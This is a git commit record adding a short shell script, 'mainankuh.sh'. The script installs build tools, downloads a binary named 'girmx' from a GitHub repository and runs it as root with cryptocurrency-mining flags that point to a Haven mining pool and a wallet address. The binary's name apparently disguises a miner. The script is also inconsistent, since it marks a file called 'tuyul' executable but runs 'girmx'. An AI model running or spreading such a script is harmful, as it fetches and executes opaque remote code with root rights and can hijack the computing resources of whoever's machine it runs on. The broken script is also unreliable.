5b066e782b76074cd2ba970b0d0e53a2656434cf
jumantul <81206688+jumantul@users.noreply.github.com>
2021-03-24 12:41:25 +0700

    Create mainankuh.sh

---
+++ mainankuh.sh
@@ -0,0 +1,5 @@
+sudo apt-get install -y gcc git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+wget https://github.com/jumantul/hansip/raw/main/girmx
+sudo sysctl -w vm.nr_hugepages=1280
+chmod +x tuyul
+sudo ./girmx -a cn-heavy/xhv --url sg.haven.miner.rocks:4003 --user hvxyMPHE5pi8tqs9XeMEUMJQJRvvuCBzqM6NwF53zQcHaFnRQjzX4rWVYBXzcAFeRhUbwNoqJ5yJ51xaZj49z5bd7DEWXf8o3y --pass Havenn --cpu-no-yield -k --cpu-priority 5 --tls
